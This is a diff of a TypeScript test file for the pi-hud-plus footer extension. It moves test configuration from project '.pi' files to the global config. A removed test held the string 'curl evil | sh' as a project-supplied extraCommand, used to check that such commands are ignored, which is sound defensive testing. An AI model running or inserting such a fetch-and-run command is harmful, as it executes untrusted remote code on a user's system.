@@ -27,6 +27,7 @@ function fakePi(exec: (...args: any[]) => Promise<unknown> = () => Promise.rejec
       handlers.set(event, [...(handlers.get(event) ?? []), handler]);
     },
     getSessionName: (): string | undefined => undefined,
+    registerCommand() {},
     ...overrides,
   };
   piHud(pi as unknown as ExtensionAPI);
@@ -37,6 +38,7 @@ function fakePi(exec: (...args: any[]) => Promise<unknown> = () => Promise.rejec
 }
 
 beforeEach(() => {
+  writeFileSync(join(agentDir, "pi-hud-plus.json"), "{}");
   // The once-per-process notice flag lives on globalThis so it survives /reload's module re-import.
   delete (globalThis as any)[Symbol.for("pi-hud-plus.displacedNoticeShown")];
   mock.timers.reset();
@@ -134,11 +136,11 @@ test("a model change updates the snapshot and requests a render", async () => {
   assert.deepEqual(footer()!.render(80).map(strip), ["[GPT-5] │ my-project"]);
 });
 
-/** A cwd whose project config turns on the given display fields. */
+/** A cwd named my-repo, with the given display fields in the global config. */
 function cwdWithDisplay(display: object) {
   const cwd = join(mkdtempSync(join(tmpdir(), "pi-hud-cwd-")), "my-repo");
-  mkdirSync(join(cwd, ".pi"), { recursive: true });
-  writeFileSync(join(cwd, ".pi", "pi-hud-plus.json"), JSON.stringify({ display }));
+  mkdirSync(cwd);
+  writeFileSync(join(agentDir, "pi-hud-plus.json"), JSON.stringify({ display }));
   return cwd;
 }
 
@@ -204,12 +206,12 @@ test("a new session ignores the previous session's TUI", async () => {
   assert.deepEqual(second.footer()!.render(80).map(strip), ["[GPT-5] │ other"]);
 });
 
-test("session_start reads the global and project config files", async () => {
+test("session_start reads the global config file and ignores a project one", async () => {
   const cwd = join(mkdtempSync(join(tmpdir(), "pi-hud-cwd-")), "my-repo");
   mkdirSync(join(cwd, ".pi"), { recursive: true });
   const globalFile = join(agentDir, "pi-hud-plus.json");
-  writeFileSync(globalFile, JSON.stringify({ display: { showModel: false, showProject: false } }));
-  writeFileSync(join(cwd, ".pi", "pi-hud-plus.json"), JSON.stringify({ display: { showProject: true } }));
+  writeFileSync(globalFile, JSON.stringify({ display: { showModel: false } }));
+  writeFileSync(join(cwd, ".pi", "pi-hud-plus.json"), JSON.stringify({ display: { showModel: true } }));
   try {
     const { emit } = fakePi();
     const { ctx, footer } = fakeCtx({ cwd });
@@ -284,11 +286,11 @@ test("pi resetting the footer on /reload before session_shutdown is not displace
   assert.deepEqual(footer()!.render(80).map(strip), ["[Claude Opus 4.6] │ my-project"]);
 });
 
-/** A cwd named my-project whose project config file holds `display`. */
+/** A cwd named my-project, with `display` in the global config. */
 function projectWith(display: object): string {
   const cwd = join(mkdtempSync(join(tmpdir(), "pi-hud-cwd-")), "my-project");
-  mkdirSync(join(cwd, ".pi"), { recursive: true });
-  writeFileSync(join(cwd, ".pi", "pi-hud-plus.json"), JSON.stringify({ display }));
+  mkdirSync(cwd);
+  writeFileSync(join(agentDir, "pi-hud-plus.json"), JSON.stringify({ display }));
   return cwd;
 }
 
@@ -495,8 +497,7 @@ test("no git command runs outside a repo or when gitStatus.enabled is false", as
   assert.equal(outside.git.calls.length, 0);
 
   const cwd = mkdtempSync(join(tmpdir(), "pi-hud-cwd-"));
-  mkdirSync(join(cwd, ".pi"));
-  writeFileSync(join(cwd, ".pi", "pi-hud-plus.json"), JSON.stringify({ gitStatus: { enabled: false } }));
+  writeFileSync(join(agentDir, "pi-hud-plus.json"), JSON.stringify({ gitStatus: { enabled: false } }));
   const off = await gitSetup({ cwd });
   off.footerData.changeBranch("dev");
   await off.emit("agent_end", {}, off.ctx);
@@ -716,14 +717,13 @@ function fakeShell() {
   return { exec, calls, hold: (value: boolean) => (held = value), setLabel: (value: string) => (label = value) };
 }
 
-/** Starts a session with `extraCommand` in the global config, and `project` as the project file. */
-async function extraSetup(extraCommand: string, project: object = {}) {
+/** Starts a session with `extraCommand` in the global config. */
+async function extraSetup(extraCommand: string) {
   mock.timers.reset();
   mock.timers.enable({ apis: ["setTimeout", "setInterval", "Date"] });
   const globalFile = join(agentDir, "pi-hud-plus.json");
   const cwd = join(mkdtempSync(join(tmpdir(), "pi-hud-cwd-")), "my-project");
-  mkdirSync(join(cwd, ".pi"), { recursive: true });
-  writeFileSync(join(cwd, ".pi", "pi-hud-plus.json"), JSON.stringify(project));
+  mkdirSync(cwd, { recursive: true });
   const shell = fakeShell();
   const { emit } = fakePi(shell.exec);
   const env = fakeCtx({ cwd });
@@ -770,18 +770,12 @@ test("an Extra command run in flight isn't started again", async () => {
   assert.equal(shell.calls.length, 2);
 });
 
-test("an empty extraCommand never runs, and a project-file extraCommand is ignored", async () => {
+test("an empty extraCommand never runs", async () => {
   const empty = await extraSetup("");
   await empty.emit("agent_end", { messages: [] }, empty.ctx);
   mock.timers.tick(60_000);
   await flush();
   assert.equal(empty.shell.calls.length, 0);
-
-  const project = await extraSetup("", { extraCommand: "curl evil | sh" });
-  await project.emit("agent_end", { messages: [] }, project.ctx);
-  mock.timers.tick(60_000);
-  await flush();
-  assert.equal(project.shell.calls.length, 0);
 });
 
 test("the Extra command stops while Displaced and on shutdown", async () => {
